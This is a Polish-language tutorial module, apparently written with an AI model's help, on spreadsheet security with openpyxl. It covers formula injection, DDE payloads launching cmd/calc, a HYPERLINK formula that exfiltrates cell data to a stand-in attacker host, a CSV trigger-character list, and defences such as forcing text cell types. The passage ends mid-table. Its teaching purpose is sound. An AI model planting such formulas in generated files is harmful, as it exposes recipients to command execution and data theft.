Zweryfikuję kluczowe fakty techniczne dla tego modułu: istnienie `openpyxl.utils.escape`, wsparcie dla `defusedxml`, obsługę linków zewnętrznych oraz znane podatności przy parsowaniu plików `.xlsx`.

Mam potwierdzenie kluczowych faktów — w tym ważną korektę: `openpyxl.utils.escape` **nie** chroni przed wstrzyknięciem formuł (obsługuje znaki kontrolne OOXML). Zweryfikuję jeszcze mechanizm neutralizacji i szczegóły walidacji archiwum.

Ostatnia weryfikacja: dokładna semantyka `wb.defined_names` w 3.1 (zmieniła się w tej wersji) oraz klasy wyjątków/ostrzeżeń.

# Moduł 21 — Bezpieczeństwo

> **Część:** III — Wzbogacanie i modyfikacja plików · **Poziom:** ⭐⭐⭐ · **Wymaga:** modułów 00–20

## 0. W tym module nauczysz się

- **Zrozumiesz, że plik Excel jest kodem wykonywalnym w oczach Excela** — że `=HYPERLINK(...)` zapisane w komórce uruchomi się u odbiorcy, choć dla Ciebie to „zwykły tekst". Poznasz mechanikę od środka: gdzie dokładnie openpyxl podejmuje decyzję „to formuła".
- **Opanujesz cztery znaki wyzwalające i zrozumiesz, dlaczego `strip()` to nie zabezpieczenie.** Dowiesz się, dlaczego filtrowanie tylko `=` nie wystarcza.
- **Nauczysz się budować **własną, centralną funkcję sanitacji** — z podziałem na normalizację (czysta logika, bez openpyxl) i zapis (z jawnym `data_type = "s"`), zgodnie z architekturą z modułu 20.
- **Poznasz prawdę o `openpyxl.utils.escape`** — i zobaczysz, dlaczego jest to najbardziej mylące API w całej bibliotece. Nie ma tam „escape-all" i musisz to zrozumieć, żeby nie zbudować fałszywego poczucia bezpieczeństwa.
- **Zrozumiesz powierzchnię ataku archiwum ZIP/XLSX**: zip bomb (i dlaczego Python **nie** chroni przed nią w `zipfile`), XXE (CVE-2017-5992), „billion laughs", path traversal, oraz jak `defusedxml` i `OPENPYXL_DEFUSEDXML` zmieniają tę grę.
- **Dowiesz się, że ochrona hasłem to nie szyfrowanie** — i co z tego wynika dla danych wrażliwych.
- **Zbudujesz skrypt „audyt pliku przed wysyłką"**, który wyłapuje ukryte warstwy skoroszytu: `veryHidden`, ukryte kolumny, ukryte w formacie `;;;`, komentarze z nazwiskami, definiowane nazwy, **linki zewnętrzne z UNC-owymi ścieżkami** (`\\serwer\udział`) i metadane autora.
- **Poznasz checklistę wdrożenia na serwer**, która zamienia „mam nadzieję, że jest bezpiecznie" w listę limitów, które można sprawdzić.

## 1. Intuicja i analogia

### 1.1. Nie wpuszczasz nieznajomego do kuchni tylko dlatego, że podał się za dostawcę

Zacznijmy od scenki, którą znasz z życia.

Jesteś w restauracji. Ktoś staje przy tylnych drzwiach, w fartuchu, z klipsem na piersi i teczką. Mówi: „Jestem od dostawcy warzyw, mam zamówienie na dziś". I co robisz? **Nie wpuszczasz go do kuchni.** Nie dlatego, że jesteś nieuprzejmy. Nie dlatego, że na pewno jest oszustem. Nie wpuszczasz go, bo:

- **legitymacja to nie tożsamość** — fartuch i klips kupisz za dwadzieścia złotych,
- **w kuchni są rzeczy, których nie powinien widzieć** (sejf, receptury),
- **w kuchni są rzeczy, którymi mógłby zrobić krzywdę** (gaz, ostre noże),
- i wreszcie: **jeśli mylisz się raz, koszt błędu jest niewspółmierny do zysku z wygody.**

No dobrze, ale co to ma wspólnego z Excelem? Wszystko. Bo w tym module **Ty jesteś kucharzem, a Twój plik Excel jest kuchnią**. A dane od użytkownika — dane od klienta, z formularza, z uploadu, z CSV od kontrahenta — to **ktoś przy tylnych drzwiach z teczką**.

I tu jest miejsce, w którym prawie wszyscy popełniają ten sam błąd:

> **Antywzorzec: „wstawiam dane od klienta bez zmian, bo to tylko Excel".**

To zdanie jest fałszywe w jednym, konkretnym i brutalnym sensie. **To nie jest „tylko Excel".** To jest dokument, który **zostanie otwarty przez program, który wykonuje instrukcje**. Excel nie jest przeglądarką obrazków. Excel jest **maszyną wykonawczą**, która czyta komórki i **robi to, co w nich napisano**.

Podam to wprost, bo to sedno modułu:

> **Komórka Excela to nie pojemnik na dane. Komórka Excela to pole kodu.**

Jeśli napiszesz w komórce `2 + 2`, zobaczysz `4`. Nikt tego nie nazywa „wykonaniem kodu", ale technicznie **to jest wykonanie kodu**. A skoro Excel wykonuje to, co znajdzie w komórce, to pytanie brzmi: **kto pisze zawartość tej komórki?**

I tu jest cała pułapka. **Ty** piszesz zawartość tej komórki — ale dane, które tam wstawiasz, napisał **ktoś inny**. A Ty wstawiasz je bez pytania, „bo to tylko tekst".

### 1.2. Dwoje drzwi, a Ty pilnujesz tylko jednych

W tej restauracji są **dwoje drzwi** i to jest obraz, który ustawi Ci cały moduł.

- **Pierwsze drzwi to Ty.** Twoje drzwi do komputera, do Pythona. Kiedy piszesz `wb.save("raport.xlsx")`, drzwi są zamknięte. Wartość `"=1+1"` nie robi nic złego — leży sobie w pamięci jako napis, znak po znaku: `=`, `1`, `+`, `1`. Python jej nie wykonuje. Excel nie jest uruchomiony. Nic się nie dzieje.

- **Drugie drzwi to Excel — i to nie są Twoje drzwi.** Otwiera je **odbiorca Twojego raportu**. Otwiera plik, który mu wysłałeś, na swoim komputerze, w swojej firmie. I wtedy Excel czyta zawartość komórek i **wykonuje** to, co przeczytał.

I teraz kluczowe zdanie, które musisz zapamiętać na zawsze:

> **Zapis do pliku to nie wykonanie. Zapis to przygotowanie egzekucji na cudzej maszynie.**

Ty nie musisz nic uruchamiać. Ty tylko **umieszczasz ładunek w miejscu, w którym ktoś inny go zdetonuje**. I ten ktoś to Twój klient, Twój kontrahent, Twoja koleżanka z księgowości — czyli osoba, która **ci zaufała**, że raport od Ciebie jest bezpieczny.

Dlatego nie wolno Ci myśleć: „u mnie nic się nie stało, więc jest OK". U Ciebie **nie miało prawa się stać nic** — bo u Ciebie nie ma drugich drzwi. A problem jest za nimi.

### 1.3. „To tylko Excel" — trzy wersje tego zdania i dlaczego każda jest błędna

Ten antywzorzec ma kilka twarzy. Rozpoznasz je w swoim kodzie:

**Wersja 1: „dane są od klienta, więc są bezpieczne".** To jest dokładnie to zdanie z sekcji 1.1 o fartuchu. Skąd wiesz, że są bezpieczne? Bo plik przyszedł mailem od firmy, która ma logo na stronie? **Lokalizacja pliku to nie jego treść.** Założenie „skoro dostałem to od zaufanej firmy, to jest bezpieczne" jest tym samym, co założenie „skoro ma klips, to jest z dostawy".

**Wersja 2: „to tylko string, przecież widać że to tekst".** To najczęstsza wersja wśród programistów. W Pythonie masz `str` i wiesz, że to dane. Problem: **`str` jest typem Pythona, a nie typem Excela.** Gdy przechodzisz przez granicę Pythona i Excela, `str` **nie znaczy „tekst"** — znaczy „zależy od zawartości". Sekcja 2.2 pokaże Ci dokładnie, gdzie openpyxl podejmuje tę decyzję. Zabrzmi to banalnie, ale to jest miejsce, w którym powstaje 90% problemów.

**Wersja 3: „escapuję przy CSV, więc mam to z głowy".** CSV nie ma typów, więc tam apostrof jest jedynym narzędziem. Ale Ty często produkujesz `.xlsx`, a `.xlsx` **ma** typy komórek. To znaczy, że masz **lepsze narzędzie** — i jeśli je pominiesz, bo „przecież wszędzie escapuję tak samo", to zabezpieczasz **niewłaściwą drogę**. To jak zamknąć okno i zostawić otwarte drzwi.

### 1.4. Plik `.xlsx` to kontener z przegrodami

Druga analogia, bez której druga połowa modułu nie będzie miała sensu.

W module 02 raz na zawsze ustaliliśmy: **`.xlsx` to archiwum ZIP z plikami XML**. Wróć do tego obrazu, ale spójrz na niego z innej strony — nie funkcjonalnej, ale **bezpieczeństwowej**.

Wyobraź sobie **kontener morski**, który wysyłasz za granicę. W manifeście przewozowym figuruje „meble biurowe, 40 sztuk". I to nawet prawda. Ale w środku, w przegrodzie za ścianą, w skrytce pod podłogą, w rurze konstrukcyjnej — **jest jeszcze sześć innych rzeczy**, których nikt nie widzi na pierwszy rzut oka. Celnik (= Twój odbiorca) widzi tylko to, co otworzy.

Skoroszyt jest takim kontenerem i ma **przegrody, o których większość użytkowników nie wie**:

| Przegroda w kontenerze | Co odpowiada w skoroszycie | Kto o tym wie |
|---|---|---|
| Ładunek na wierzchu | Widoczne arkusze, widoczne komórki | wszyscy |
| Skrytka za ścianą | Arkusze `hidden` | każdy, kto kliknie „Unhide" |
| Pomieszczenie bez drzwi | Arkusze `veryHidden` | **nikt** — nie ma go w interfejsie |
| Zaklejone pudło | Kolumny/wiersze ukryte | ten, kto kliknie nagłówek |
| Napis znikającym atramentem | Wartości z formatem `;;;` | nikt — Excel pokazuje pustkę |
| Karteczki w środku | Komentarze (z **autorem**!) | każdy, kto najedzie myszką |
| Adres zwrotny | Metadane: autor, tytuł, firma | ten, kto kliknie „Właściwości" |
| List przewozowy do innego kontenera | **Linki zewnętrzne** — mogą wskazywać `\\serwer\udział` | analityk, czasem nikt |
| Zdjęcia w opakowaniu | `xl/media/*` | nikt |
| Stary ładunek na dnie | `xl/pivotCache/*`, `customXml/` | nikt |

Zapamiętaj zwłaszcza dwie: **`veryHidden`** i **linki zewnętrzne**. Pierwsza jest niebezpieczna, bo **nie ma jej w żadnym menu** — arkusza `veryHidden` nie odhaczy nawet „Odkryj arkusz", takiej opcji w Excelu po prostu nie ma dla niego. Odkryć go można tylko kodem. W praktyce: ludzie trzymają tam ceny zakupu, stawki marży, dane osobowe, klucze API (tak, naprawdę).

Druga jest niebezpieczna z innego powodu, który pokaże sekcja 2.10 — **link zewnętrzny zawiera ścieżkę do pliku na cudzym komputerze**, często w formie `\\serwer\dane$\...`. To nie jest tylko informacja. To **gotowy adres do sondowania sieci wewnętrznej**.

### 1.5. Trzy kategorie prawdy dla tego modułu

Zgodnie z konwencją kursu — tabela, wokół której zbudowany jest ten moduł:

| Kategoria | W kontekście bezpieczeństwa |
|---|---|
| **openpyxl potrafi** | wymusić typ tekstowy komórki (`cell.data_type = "s"`), wykryć, co jest formułą (`data_type == "f"`), odczytać ukryte arkusze (`sheet_state`), ukryte kolumny/wiersze, komentarze z autorami, definiowane nazwy (`.hidden`), właściwości dokumentu, liczyć linki zewnętrzne, **nie liczyć formuł** (to zaleta!), chronić strukturę skoroszytu hasłem, użyć `defusedxml`, gdy jest zainstalowany |
| **openpyxl potrafi częściowo** | czyścić pliki wejściowe (nie „przepiorze" wszystkiego — sekcja 2.11), obsłużyć `;;;` (widać `number_format`, ale to nie „ukrywanie"), `keep_links=False` (usuwa **definicje** linków, ale nie naprawia formuł, które się do nich odwołują), walidować rozszerzenie (tylko przy ścieżce, nie przy buforze!) |
| **openpyxl gubi / nie ma** | mechanizmu „escape-all" dla formuł, sprawdzania zip bomb, limitu rozpakowanego rozmiaru, limitu czasu, wykrywania DDE, szyfrowania pliku hasłem (to osobny format!), możliwości wykonania formuły (i całe szczęście) |

## 2. Teoria

### 2.1. Wstrzyknięcie formuły — mechanika od środka

Zacznijmy od dokładnego zrozumienia **jak** to działa. Bez tego każda obrona będzie strzelaniem na oślep.

#### 2.1.1. Co robi openpyxl, gdy przypisujesz wartość

W module 05 ustaliliśmy: `ws["A1"] = wartość`. Powiedzieliśmy też, że openpyxl **odgaduje typ** na podstawie wartości. Czas zobaczyć tę regułę w kodzie źródłowym (to `openpyxl.cell.cell`, funkcja `_bind_value`):

```python
elif dt == "s" and not isinstance(value, CellRichText):
    value = self.check_string(value)
    if len(value) > 1 and value.startswith("="):
        self.data_type = 'f'          # ⬅ TU RODZI SIĘ PROBLEM
    elif value in ERROR_CODES:
        self.data_type = 'e'
```

Przeczytajmy to spokojnie, bo to jest **cała istota modułu**:

1. `dt == "s"` — wartość, którą przypisałeś, była `str`. Dla Pythona to tekst. Dla openpyxl — kandydat na tekst.
2. `len(value) > 1 and value.startswith("=")` — **jeśli string ma więcej niż jeden znak i zaczyna się od `=`**, to openpyxl uznaje: **to nie jest tekst, to formuła**.
3. `self.data_type = 'f'` — i ustawia typ komórki na `f` (od *formula*).

I teraz najważniejsza część: **to nie jest błąd openpyxl.** To jest **właściwe zachowanie**. Gdybyś napisał w Excelu `=SUM(A1:A10)`, to właśnie tego byś chciał. Gdyby openpyxl tego nie robił, nie dałoby się programowo tworzyć formuł.

**Wniosek:** openpyxl jest tu **posłuszny i naiwny**. Robi to, o co go poprosisz, i nie ma sposobu, żeby odróżnił „formuła, którą ja, programista, chcę zapisać" od „formuła, którą wpisał klient w polu 'uwagi'". **Ty jesteś jedyną osobą, która wie, skąd pochodzi ta wartość.** Biblioteka tego nie wie i nie dowie się.

#### 2.1.2. Co trafia do pliku

Zapiszmy to i zajrzyjmy do środka — to jest „co trafi do pliku" w najczystszej postaci:

```python
from openpyxl import Workbook

wb = Workbook()
ws = wb.active
ws["A1"] = "=1+1"          # przypisanie stringa
ws["A2"] = "zwykły tekst"

print(ws["A1"].data_type)  # f   <- FORMULA!
print(ws["A2"].data_type)  # s   <- string

wb.save("output/injection.xlsx")
```

W ZIP-ie, w `xl/worksheets/sheet1.xml`, znajdziesz:

```xml
<c r="A1" t="str"><f>1+1</f></c>
<c r="A2" t="s"><v>0</v></c>
```

Zwróć uwagę na różnicę: w `A1` **nie ma** elementu `<v>` (wartość), jest `<f>` (**f**ormula). Excel, czytając ten plik, nie zobaczy napisu „=1+1" do wyświetlenia. Zobaczy **polecenie**: „oblicz `1+1` i pokaż wynik". A `t="str"` mówi mu jeszcze: „jeśli nie umiesz policzyć, zostaw wynik jako tekst".

**Konsekwencja praktyczna, którą musisz przyswoić:** po zapisaniu pliku i wczytaniu go z powrotem, w komórce `A1` **nie ma już napisu „=1+1" w sensie „dane"**. Jest formuła. I choćbyś sto razy mówił „przecież wpisałem stringa" — do pliku trafił **kod**.

#### 2.1.3. Znaki wyzwalające — i dlaczego `=` to nie wszystko

Teraz rozszerzmy obraz. Owszem, openpyxl reaguje **tylko** na `=`. Ale **Excel i inne arkusze reagują na więcej** i to jest ten moment, w którym obrona tylko na `=` się rozsypuje.

**Dla `.xlsx` i openpyxl** wyzwalaczem jest `=` jako **pierwszy znak** stringa o długości > 1. Kropka.

**Dla `.csv`** — a więc dla plików, w których typy ustala **program czytający**, nie plik — wyzwalaczy jest więcej. OWASP (standard branżowy) wymienia:

| Znak | Co się dzieje |
|---|---|
| `=` | formuła — klasyka |
| `+` | traktowane jak początek formuły przez część czytników |
| `-` | jak wyżej (i uwaga: **ujemne liczby też zaczynają się od minusa**!) |
| `@` | historycznie: odwołanie do funkcji/funkcja; część czytników interpretuje jako początek wyrażenia |
| tabulator `\t` | może być zignorowany przy sprawdzaniu, a potem „odsłonić" `=` za sobą |
| CR `\r` | jak tabulator — znak sterujący, który może zostać pominięty przy ocenie |

I tu dochodzimy do zdania z briefu, które trzeba rozwinąć bardzo precyzyjnie:

> **Dlaczego sam `strip()` nie wystarcza.**

`strip()` usuwa białe znaki z **początku i końca**. Wyobraź sobie, że ktoś wpisuje do pola „uwagi": `" =SUM(A1:A100)"` (spacja, potem `=`).

- `strip()` da Ci `"=SUM(A1:A100)"`.
- **I właśnie tym `strip()`em stworzyłeś formułę.** Usunąłeś niewinne białe znaki, które czyniły z tego tekst — i teraz string zaczyna się od `=`, więc openpyxl zakwalifikuje go jako formułę.

Ale to jeszcze nie wszystko. `strip()` nie wystarcza z **trzech** powodów i warto je wymienić wszystkie:

1. **Może stworzyć problem, którego nie było.** Jak wyżej — spacja chroniła, `strip()` ją usunął.
2. **Nie zmienia semantyki pliku.** Jeśli zapiszesz `"=1+1"` do `.xlsx`, to `strip()` czy bez niego — w pliku będzie formuła. Bo decyduje **pierwszy znak**, nie to, czy gdzieś w ogóle był biały znak.
3. **Działa tylko w Twoim procesie.** Jeśli walidujesz na wejściu i zapisujesz na wyjściu bez walidacji, to żadne `strip()` w walidacji nie pomoże — bo droga od „walidacja" do „zapis" może zostać ominięta (inny endpoint, inny skrypt, ręczna poprawka w pliku, „a ja tylko zmienię jedną linijkę").

Do tego dochodzi kwestia **białych znaków wewnątrz**: w CSV część czytników pomija wiodące białe znaki, decydując „to jest formuła", i dopiero potem interpretuje treść. Dlatego OWASP mówi o **tabie i CR** — znakach, które w pewnych łańcuchach przetwarzania znikają, odsłaniając to, co było za nimi.

**Wniosek:** obrona polegająca na sprawdzeniu „czy zaczyna się od `=`" po `strip()` jest **obroną na jedną drogę i jeden znak**. Musisz sprawdzać **wszystkie cztery znaki wyzwalające** i to **na surowej wartości**, przed jakąkolwiek normalizacją.

#### 2.1.4. DDE — dlaczego to brzmi groźniej niż jest (i dlaczego i tak jest groźne)

Historycznym, najbrzydszym przypadkiem jest **DDE** (Dynamic Data Exchange). Konstrukcja wygląda tak:

```text
+CMD|'/c calc'!A1
=cmd|' /C calc'!A0
```

Co to robi? `cmd` to historyczna funkcja Excela, która potrafiła wywołać **polecenie systemowe**. `'/c calc'` to polecenie „uruchom kalkulator". Wersje z `+` na początku obchodziły część filtrów.

Brzmi jak z filmu. Jaka jest prawda dzisiaj?

**Uczciwie: współczesny Excel domyślnie blokuje DDE i wyświetla ostrzeżenie** przy tego typu konstrukcjach. To już nie jest „wpisuję do komórki i kalkulator wstaje". **Ale** i to jest ważne dla Twojej decyzji projektowej — trzeba powiedzieć całą prawdę:

1. **Ostrzeżenie to dialog, a dialog to coś, co użytkownik klika.** Wiesz, jak to wygląda: żółty pasek, „Włącz zawartość", „Tak, ufam temu dokumentowi". Ludzie klikają, bo to ich codzienna praca i mają trzydzieści takich plików dziennie. **Bezpieczeństwo oparte na tym, że użytkownik nie kliknie, nie jest bezpieczeństwem.**
2. **Nie wszystkie programy są tak ostrożne jak Excel.** **LibreOffice domyślnie ewaluuje `=`** przy imporcie i różnice w konfiguracji firmowych instalacji są realne. Twój plik trafi nie tylko do Excela 365.
3. **Nie wszystkie ataki wymagają DDE.** Nowoczesne warianty są cichsze i polegają na **eksfiltracji danych**, a nie na uruchamianiu programów. Najprostszy wzorzec:

```text
=HYPERLINK("https://zly.example/zbierz?d=" & A1 & B1, "Kliknij, aby zobaczyć szczegóły")
```

Co tu się dzieje? Rapert jest ładny. W komórce jest **ładny niebieski link z napisem „Kliknij, aby zobaczyć szczegóły"** — nie widać w nim żadnej podejrzanej treści. Użytkownik klika, bo przecież raport sam go zaprasza. I w tym momencie **zawartość komórek `A1` i `B1` (czyli prawdziwe dane — nazwisko kontrahenta, kwota, numer faktury) wędruje w adresie URL na serwer atakującego**. To się nazywa eksfiltracja i nie wymaga ani makr, ani DDE, ani niczego, co Excel zablokuje.

4. **Istnieją funkcje sieciowe, o których warto wiedzieć.** Excel ma funkcje typu `WEBSERVICE()` (pobiera URL) i mechanizmy RTD. Współczesny Excel ogranicza je do zaufanych lokalizacji, ale **nie buduj na tym założenia** — konfiguracje firmowe bywają różne, a Ty nie kontrolujesz maszyny odbiorcy.

**Wniosek, który nie zmieni się przez najbliższe lata:** nie próbuj oceniać, „czy to jest groźny payload". Czarnych list nigdy nie da się domknąć — dojdzie piąty znak, dojdzie nowa funkcja, dojdzie nowy czytnik. **Zamiast tego spraw, żeby dane użytkownika nigdy nie były formułami.** To jest jedyna obrona, która się skaluje.

### 2.2. Naprawa — trzy sposoby i kiedy który

Mamy więc problem zdefiniowany: **string zaczynający się od znaku wyzwalającego staje się kodem**. Jak temu zaradzić? Masz trzy drogi i każda jest właściwa **w innym kontekście**.

#### Droga 1 — wymuszenie typu tekstowego (`data_type = "s"`) — dla `.xlsx`

To jest **poprawna droga dla plików `.xlsx`** i to jest droga, której będziemy używać w tym module.

```python
from openpyxl import Workbook, load_workbook

wb = Workbook()
ws = wb.active

ws["A1"] = "=1+1"                 # openpyxl uznaje to za formułę (data_type == "f")
print(ws["A1"].data_type)         # f

ws["A1"].data_type = "s"          # ⬅ WYMUSZAMY TEKST (kolejność ma znaczenie!)
print(ws["A1"].data_type)         # s
wb.save("output/juz_bezpieczne.xlsx")

# --- i dowód, że przeżyło round-trip ---
wb2 = load_workbook("output/juz_bezpieczne.xlsx")
komorka = wb2.active["A1"]
print(komorka.data_type)          # s
print(komorka.value)              # =1+1   <- wartość NIEZMIENIONA, tylko jako tekst
wb2.close()
```

**Co się dzieje w pamięci.** `ws["A1"] = "=1+1"` przechodzi przez `_bind_value`, widzi `=` na początku i ustawia `data_type = "f"`. Potem **Ty** to korygujesz: `data_type = "s"`. Wartość w `.value` **nie zmieniła się ani o znak** — nadal to napis `=1+1`. Zmienił się **wyłącznie sposób, w jaki ta wartość zostanie zapisana**.

**Co trafi do pliku.** Do `sheet1.xml` trafi teraz `<c r="A1" t="s"><v>0</v></c>` plus wpis `=1+1` w `xl/sharedStrings.xml`. **Żadnego `<f>`.** Excel odczyta to jako **tekst** — wyświetli `=1+1` w komórce, wyrównane do lewej, nic nie obliczy, nic nie wykona. Użytkownik widzi dokładnie to, co wpisał. Nic nie zostało zmienione w treści.

I jeszcze trzy ważne szczegóły techniczne:

**Szczegół A — kolejność jest obowiązkowa.** Musi być: najpierw przypisanie wartości, potem `data_type = "s"`. Dlaczego? Bo `data_type` jest ustawiany **wewnątrz** `_bind_value`, czyli **przez przypisanie wartości**. Jeśli zrobisz to odwrotnie, przypisanie nadpisze Twoje ustawienie:

```python
ws["A1"].data_type = "s"     # ustawiam...
ws["A1"] = "=1+1"            # ...i przypisanie to NADPISUJE na "f"!
print(ws["A1"].data_type)    # f   <- i po obronie
```

To jest dokładnie ta sama pułapka, co niemutowalne style z modułu 09 („przybijasz pieczątkę, a nie poprawiasz nadrukowaną etykietę"), tylko w innym przebraniu: **ustawienie, które zostało nadpisane późniejszą operacją**. Zapamiętaj wzorzec: **wartość najpierw, typ potem.**

**Szczegół B — alternatywa: `set_explicit_value`.** openpyxl ma też metodę, która robi obie rzeczy naraz:

```python
ws["A1"].set_explicit_value("=1+1", data_type="s")   # sprawdź w dokumentacji swojej wersji
```

Wygodne, ale używam jej ostrożnie, bo (a) rzadziej pojawia się w tutorialach, więc mniej osób ją zna, a (b) `data_type="s"` jest **domyślną wartością parametru**, co jest pułapką samą w sobie: `cell.set_explicit_value("=1+1")` wygląda jak „ustaw wartość", a faktycznie **wymusza tekst**. Sprawdź w dokumentacji swojej wersji i — jak zawsze — pokryj testem.

**Szczegół C — dozwolone wartości `data_type`.** Z klasy `Cell`:

```python
VALID_TYPES = ('s', 'f', 'n', 'b', 'n', 'inlineStr', 'e', 'str')
```

Czyli: `s` = string, `f` = formuła, `n` = liczba, `b` = boolean, `e` = błąd, `inlineStr` = tekst inline, `str` = **wartość formuły jako tekst** (uwaga — to nie to samo co `s`!). Wartość spoza listy podniesie `ValueError: Invalid data type: ...`. Nie używaj „na wyczucie" — używaj `s`.

#### Droga 2 — apostrof jako prefiks — dla `.csv`

Dla plików `.csv` nie masz typów komórek, więc nie masz `data_type`. Zostaje konwencja z OWASP: **poprzedź wartość apostrofem**.

```python
DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

def neutralise_csv(value):
    """Konwencja OWASP dla CSV: prefiks apostrofu na wartosci ryzykownej."""
    if isinstance(value, str) and value.startswith(DANGEROUS_PREFIXES):
        return "'" + value
    return value

print(neutralise_csv("=1+1"))      # '=1+1
print(neutralise_csv("zwykły"))    # zwykły
```

**Dlaczego to działa w CSV:** CSV nie niesie typów, więc czytnik (Excel, LibreOffice) musi **zdecydować sam**. Widząc wiodący apostrof, traktuje zawartość jako tekst.

**Uczciwe ostrzeżenie — i to jest miejsce, w którym wiele poradników kłamie:** ten mechanizm jest **konwencją czytnika**, a nie gwarancją formatu. Różne programy mogą zachować apostrof w widocznej treści. Dlatego:

> **Nie używaj apostrofu w `.xlsx`.** Do `.xlsx` masz `data_type = "s"` i to jest narzędzie precyzyjne. Apostrof w XLSX stanie się **zwykłym znakiem w wartości** — openpyxl go nie zdejmie, a Excel najprawdopodobniej **pokaże go w komórce**, bo prefiks tekstowy Excela działa w momencie *wpisywania*, a nie *wyświetlania*. (W specyfikacji OOXML istnieje osobny znacznik „prefiks cytatu" w definicji stylu komórki, który odpowiada za ten efekt — ale openpyxl nie eksponuje go w prostym API; sprawdź w dokumentacji swojej wersji, jeśli chcesz iść tą drogą.) **Domyślnie: w XLSX — `data_type`, w CSV — apostrof.**

Zauważ też, jaka jest tu **pułapka** w samej liście `DANGEROUS_PREFIXES`: zawiera `-`. A `-` to przecież **minus w liczbach ujemnych**! Jeśli ślepo zastosujesz tę funkcję do kolumny z kwotami, zamienisz `-1200.50` na `'-1200.50` i **zniszczysz dane liczbowe w raporcie**. Konsekwencja: funkcja musi być **świadoma kontekstu** — stosujesz ją **tylko do kolumn tekstowych**. To zresztą dokładnie to, o czym mówiła sekcja 2.3 w module 20 („testuj typy, nie tylko wartości").

#### Droga 3 — walidacja whitelistowa — dla wszystkiego

To jest najsilniejsza obrona i najbardziej niedoceniana, bo … nie jest „techniczna".

Zamiast pytać „czy ta wartość jest niebezpieczna?" (czarna lista — zawsze niekompletna), pytaj **„czy ta wartość należy do zbioru dopuszczalnych?"** (biała lista — z definicji kompletna).

Praktyczne zastosowania:

- **Pole „status"** → dopuszczalne tylko `{"Nowe", "W trakcie", "Zamknięte"}`. Wartość spoza zbioru → odrzuć albo zamień na `"Nieznany"`.
- **Pole „NIP"** → dopuszczalne tylko cyfry i kreski, 10–14 znaków. Regex, nie „czy nie zaczyna się od `=`".
- **Pole „data"** → parsuj do `datetime` **i zapisuj jako `datetime`** (typ `n`/`d` w Excelu). Wtedy żaden znak wyzwalający nie ma szans, bo wartość nigdy nie jest stringiem.
- **Pole „kwota"** → parsuj do `float`/`Decimal` **i zapisuj jako liczbę**. To samo.
- **Pole „uwagi" (wolny tekst)** → **tu nie ma białej listy.** I dlatego tutaj **właśnie** używasz drogi 1 (`data_type = "s"`).

I to jest najważniejszy wniosek architektoniczny z tego podziału:

> **Rodzaj obrony zależy od tego, czy pole ma znany kształt, czy nie.** Pola o znanym kształcie (liczby, daty, enumy) konwertujesz do typu — i problem znika u źródła. Pole wolnego tekstu **jest** ryzykowne z natury, więc wymuszasz typ tekstowy przy zapisie.

To nie jest już „escapowanie danych". To jest **projektowanie przepływu danych**, w którym ścieżka „string z sieci → komórka" w ogóle nie istnieje dla pól, które nie są wolnym tekstem. Zapamiętaj to zdanie — wrócimy do niego w module 26, gdzie stanie się warstwą architektury („sanitacja na wejściu do domeny, nie przy zapisie").

### 2.3. `openpyxl.utils.escape` — najbardziej myląca nazwa w bibliotece

Teraz fragment, którego nie znajdziesz w większości poradników, a który jest **kluczowy dla Twojego bezpieczeństwa**. Uwaga, bo to jest miejsce, w którym łatwo zbudować fałszywe poczucie bezpieczeństwa.

Kurs bazowy mówił: *„openpyxl.utils.escape jeśli dostępne"*. Sprawdziłem źródło. Oto ono w całości (najważniejsze fragmenty):

```python
"""
OOXML has non-standard escaping for characters < \031
"""
import re

def escape(value):
    r"""
    Convert ASCII < 31 to OOXML: \n == _x + hex(ord(\n)) + _
    """
    CHAR_REGEX = re.compile(r"[\001-\031]")

    def _sub(match):
        return "_x{:0>4x}_".format(ord(match.group(0)))

    return CHAR_REGEX.sub(_sub, value)

def unescape(value):
    r"""
    Convert escaped strings to ASCIII: _x000a_ == \n
    """
    ESCAPED_REGEX = re.compile("_x([0-9A-Fa-f]{4})_")
    ...
```

Przeczytaj **docstring**, nie nazwę. Nazwa mówi `escape` — brzmi jak „escapowanie danych, czyli zabezpieczanie". Docstring mówi: **„OOXML has non-standard escaping for characters < \031"**.

Co to znaczy? To znaczy, że ta funkcja:

- **zamienia znaki sterujące ASCII (kody 1–31) na ich reprezentację `_xHHHH_`**, gdzie `HHHH` to kod szesnastkowy,
- np. znak nowej linii `\n` (kod 10) staje się napisem `_x000a_`,
- `unescape()` robi to w drugą stronę.

I teraz kluczowe rozróżnienie:

> **`openpyxl.utils.escape` jest narzędziem do obsługi znaków sterujących w XML-u. To NIE JEST narzędzie do ochrony przed wstrzyknięciem formuł. Nie ma z nim nic wspólnego.**

Sprawdźmy logicznie, dlaczego nie mogłoby nim być. Weź payload `=1+1` i przepuść przez `escape()`:

- `=` to kod 61, czyli `\075` w zapisie ósemkowym — **powyżej 31**.
- `1` to kod 49 — **powyżej 31**.
- `+` to kod 43 — **powyżej 31**.

Regex `[\001-\031]` **nie dopasuje ani jednego znaku**. `escape("=1+1")` zwróci `"=1+1"` — **niezmienione**. Formuła pozostaje formułą.

**Konsekwencja praktyczna, i to jest sedno:** nie ma w openpyxl **żadnej** funkcji, która „zabezpieczy wsad". Ani `escape`, ani nic innego. Nie ma „escape-all". **Musisz zbudować własną, centralną funkcję sanitacji** i — co równie ważne — **ją przetestować** (i tu wraca cały moduł 20: test pułapki z `=`, test właściwościowy na niezmiennik „wynik nigdy nie ma `data_type == 'f'`").

**Do czego `escape()` naprawdę się przydaje?** Do sytuacji odwrotnej: gdy w danych (legalnie!) masz znak sterujący i musisz go zapisać. Ale uwaga — w module 05 (i w kodzie `check_string`) ustaliliśmy, że openpyxl **rzuca wyjątek** na część znaków sterujących:

```python
def check_string(self, value):
    ...
    value = value[:32767]                              # obcina do limitu Excela
    if next(ILLEGAL_CHARACTERS_RE.finditer(value), None):
        raise IllegalCharacterError(f"{value} cannot be used in worksheets.")
    return value
```

Czyli część znaków (np. `\x00`, `\x01`, `\x0b`, `\x0c`, `\x1b`) **nie przejdzie** — dostaniesz `IllegalCharacterError`. A `\t` (9), `\n` (10) i `\r` (13) — paradoksalnie! — **przejdą**, bo XML 1.0 je dopuszcza. Zwróć uwagę na ten paradoks, bo jest pouczający:

> **Znaki, które openpyxl przepuści bez mrugnięcia (`\t`, `\r`), są dokładnie tymi, które OWASP wymienia jako znaki wyzwalające w kontekście CSV.** To pokazuje, że „legalne dla biblioteki" i „bezpieczne dla odbiorcy" to **dwa różne pytania**.

**Zbierzmy to w jedną tabelę-pułapkę:**

| Funkcja / mechanizm | Co naprawdę robi | Czy chroni przed formułami |
|---|---|---|
